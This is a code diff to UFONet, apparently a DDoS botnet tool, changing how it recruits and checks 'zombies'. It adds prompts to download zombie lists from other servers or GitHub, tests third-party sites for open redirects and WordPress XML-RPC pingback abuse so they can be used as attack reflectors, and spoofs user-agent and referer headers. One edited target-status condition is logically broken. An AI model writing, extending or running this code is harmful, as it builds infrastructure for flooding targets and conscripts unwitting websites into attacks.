@@ -2174,6 +2174,9 @@ class UFONet(object):
             if abductions_reply == "" and troops_reply == "" and robots_reply == "" and drones_reply == "" and reflectors_reply == "" and crystals_reply == "" and warps_reply == "":
                 print("[AI] [Control] [Blackhole] [Server] Reply: [VORTEX FAILED!]")
                 print('-'*12 + '\n')
+                print("[Info] [AI] You can try to download [Zombies] from a different [Blackhole] [Server] (provided by someone!) with:\n\n ex: ufonet --down-from '<IP>'")
+                print("\nOr/And from a [Blackhole] [GitHub] with:\n\n ex: ufonet --download-github")
+                print('-'*12 + '\n')
                 print("[Error] [AI] Unable to download list of [Zombies] from this [Blackhole] [Server] -> [Exiting!]\n")
                 return
             f = open('botnet/abductions.txt.gz', 'wb')
@@ -2200,6 +2203,9 @@ class UFONet(object):
             print("[AI] [Control] [Blackhole] [Server] Reply: [VORTEX READY!] ;-)")
         except:
             print("[AI] [Control] [Blackhole] [Server] Reply: [VORTEX FAILED!]")
+            print('-'*12 + '\n')
+            print("[Info] [AI] You can try to download [Zombies] from a different [Blackhole] [Server] (provided by someone!) with:\n\n ex: ufonet --down-from '<IP>'")
+            print("\nOr/And from a [Blackhole] [GitHub] with:\n\n ex: ufonet --download-github")
             print('-'*12 + '\n')
             print("[Error] [AI] Unable to download list of [Zombies] from this [Blackhole] [Server] -> [Exiting!]\n")
             return
@@ -3079,7 +3085,7 @@ class UFONet(object):
             if target_reply == "": # check for target's status resolved by [UCAVs]
                 pass
             else:
-                if not "is down" or not "looks down" in target_reply: # parse external service for reply
+                if not "is down" or not "looks down" or not "No info found for host" in target_reply: # parse external service for reply
                     print("[Info] [UCAVs] " + name_ucav + " -> Target is ONLINE! -> [Keep shooting!]")
                     self.num_is_up = self.num_is_up + 1 
                 else:
@@ -3893,7 +3899,7 @@ class UFONet(object):
 
     def testing_offline(self):
         # check for zombies offline
-        print ("\n[Info] [AI] Checking for [Zombies] offline!\n")
+        print ("\n[Info] [AI] Checking (sending HTTP HEAD requests) for [Zombies] offline...\n")
         print('='*35)
         zombies_online = 0
         zombies_offline = 0
@@ -3929,9 +3935,15 @@ class UFONet(object):
             if zombie_type == 'Alien': # [Aliens] are made with keyword ;$POST;
                 sep = ';$POST;'
                 zombie = zombie.split(sep, 1)[0]
-            reply = str(self.connect_zombie(zombie))
+            try:
+                reply = str(self.connect_zombie(zombie))
+            except:
+                reply = None
             if reply:
-                status = "ONLINE!"
+                if reply == "200" or reply == "301" or reply == "302":
+                    status = "ONLINE! -> [OK!]"
+                else:
+                    status = "ONLINE! -> [BUT replying an INVALID HTTP CODE]"
                 zombies_online = zombies_online + 1
             else:
                 status = "NOT Working!"
@@ -3939,7 +3951,7 @@ class UFONet(object):
             print("\nName:", name_zombie)
             print("Type: [", zombie_type, "]")
             print("Vector:", zombie)
-            print("HTTP Code:", reply)
+            print("HTTP Code: [", reply, "]")
             print("STATUS:", status)
             print('-'*21)
             if status == "NOT Working!": # add to discarded zombies
@@ -4104,7 +4116,7 @@ class UFONet(object):
         options = self.options
         if self.options.testall: #testing_all
             print('='*51)
-        print ("Are 'plasma' reflectors ready? :-) (XML-RPC Check):")
+        print ("Are 'plasma' reflectors ready? :-) (XML-RPC 'Pingback' Vulnerability Check):")
         print('='*51)
         num_active_rpcs = 0
         num_failed_rpcs = 0
@@ -4115,7 +4127,7 @@ class UFONet(object):
             self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
             headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
             if rpc.startswith("http://") or rpc.startswith("https://"):
-                print("[Info] [X-RPCs] Searching 'Pingback' on:", rpc)
+                print("[Info] [X-RPCs] Exploiting 'X-Pingback' at:", rpc)
                 rpc_host = rpc.replace("/xmlrpc.php", "")
                 rpc_vulnerable, rpc_pingback_url = self.search_rpc(rpc_host)
                 if rpc_vulnerable == True: # discover XML-RPC system.listMethods allowed
@@ -4123,23 +4135,28 @@ class UFONet(object):
                     try:
                         if options.proxy: # set proxy
                             self.proxy_transport(options.proxy)
-                        req = urllib.request.Request(rpc_pingback_url, rpc_methods.encode('utf-8'), headers)
-                        target_reply = urllib.request.urlopen(req, context=self.ctx).read().decode('utf-8')
+                        try:
+                            req = urllib.request.Request(rpc_pingback_url, rpc_methods.encode('utf-8'), headers)
+                            target_reply = urllib.request.urlopen(req, context=self.ctx).read().decode('utf-8')
+                        except:
+                            if self.options.verbose:
+                                traceback.print_exc()
                         if self.options.verbose:
                             print("[Info] [X-RPCs] Reply:", target_reply)
                         if "pingback.ping" in target_reply: # XML-RPC pingback.ping method is allowed!
-                            print("[Info] [AI] [ "+rpc+" ] ->  [VULNERABLE!]")
+                            print("[Info] [AI] -> [VULNERABLE!]")
                             rpcs_ready.append(rpc_pingback_url) # save XML-RPC path as RPC zombie
                             num_active_rpcs = num_active_rpcs + 1 # add fail to rpcs stats
                         else:
-                            print("[Info] [AI] [ "+rpc+" ] ->  [NOT vulnerable...]")
+                            print("[Info] [AI] -> [NOT vulnerable...]")
                             num_failed_rpcs = num_failed_rpcs + 1 # add fail to rpcs stats
                     except:
-                        print("[Info] [AI] It is NOT vulnerable...")
+                        print("[Info] [AI] -> [NOT vulnerable...]")
                         num_failed_rpcs = num_failed_rpcs + 1 # add fail to rpcs stats
                 else:
-                    print("[Info] [AI] It is NOT vulnerable...")
+                    print("[Info] [AI] -> [NOT vulnerable...]")
                     num_failed_rpcs = num_failed_rpcs + 1 # add fail to rpcs stats
+            print('-'*21)
         print('='*18)
         print("OK:", num_active_rpcs, "Fail:", num_failed_rpcs)
         print('='*18)
@@ -4148,7 +4165,7 @@ class UFONet(object):
         else:
             # update 'rpcs' list
             if num_active_rpcs == 0:
-                print("\n[Info] [X-RPCs] Not any vulnerable 'rpc' active!\n")
+                print("\n[Info] [X-RPCs] Not any vulnerable 'XML-RPC' active!\n")
                 return
             else:
                 if not self.options.forceyes:
@@ -4165,7 +4182,7 @@ class UFONet(object):
                         print("\n[Info] [AI] Botnet updated! -> ;-)\n")
 
     def testing(self, zombies):
-        # test Open Redirect vulnerabilities on webapps and show statistics
+        # test Open Redirect exploiting and show statistics
         # HTTP HEAD check
         army = 0
         print ("Are 'they' alive? :-) (HEAD Check):")
@@ -4180,7 +4197,10 @@ class UFONet(object):
             if zombie.startswith("http://") or zombie.startswith("https://"):
                 # send HEAD connection
                 self.head = True
-                self.connect_zombies(zombie)
+                try:
+                    self.connect_zombies(zombie)
+                except:
+                    pass
         while self.herd.no_more_zombies() == False:
             time.sleep(1)
         for zombie in self.herd.done:
@@ -4189,7 +4209,7 @@ class UFONet(object):
             if self.herd.get_result(zombie):
                 code_reply = self.herd.get_result(zombie)
                 self.head = False
-                if code_reply == "200" or code_reply == "302" or code_reply == "301" or code_reply == "401" or code_reply == "403" or code_reply == "405":
+                if code_reply == "200" or code_reply == "302" or code_reply == "301": # HEAD check pass!
                     name_zombie = t.netloc
                     if name_zombie == "":
                         name_zombie = zombie
@@ -4197,9 +4217,21 @@ class UFONet(object):
                     print("Status: OK ["+ code_reply + "]")
                     num_active_zombies = num_active_zombies + 1
                     active_zombies.append(zombie)
+                elif code_reply == "401":
+                    print("Zombie:", t.netloc)
+                    print("Status: Unauthorized ["+ code_reply + "]")
+                    num_failed_zombies = num_failed_zombies + 1
+                elif code_reply == "403":
+                    print("Zombie:", t.netloc)
+                    print("Status: Error Forbidden ["+ code_reply + "]")
+                    num_failed_zombies = num_failed_zombies + 1
                 elif code_reply == "404":
                     print("Zombie:", t.netloc)
                     print("Status: Not Found ["+ code_reply + "]")
+                    num_failed_zombies = num_failed_zombies + 1
+                elif code_reply == "500":
+                    print("Zombie:", t.netloc)
+                    print("Status: Internal Server Error ["+ code_reply + "]")
                     num_failed_zombies = num_failed_zombies + 1
                 else:
                     print("Zombie:", t.netloc, "\nVector:", zombie)
@@ -4236,7 +4268,10 @@ class UFONet(object):
                 if name_zombie == "":
                     name_zombie = zombie
                 self.payload = True
-                self.connect_zombies(zombie)
+                try:
+                    self.connect_zombies(zombie)
+                except:
+                    pass
                 self.payload = False
             while self.herd.no_more_zombies() == False:
                 time.sleep(1)
@@ -4301,7 +4336,7 @@ class UFONet(object):
             print('='*24)
             print("Working [Zombies]:", num_active_zombies)
             print('='*24)
-            print("\n[Info] [AI] [Zombies] aren't replying to your HEAD check! -> [Exiting!]\n")
+            print("\n[Info] [AI] [Zombies] aren't replying to your HTTP HEAD requests! -> [Exiting!]\n")
 
     def testing_all(self):
         # test whole botnet
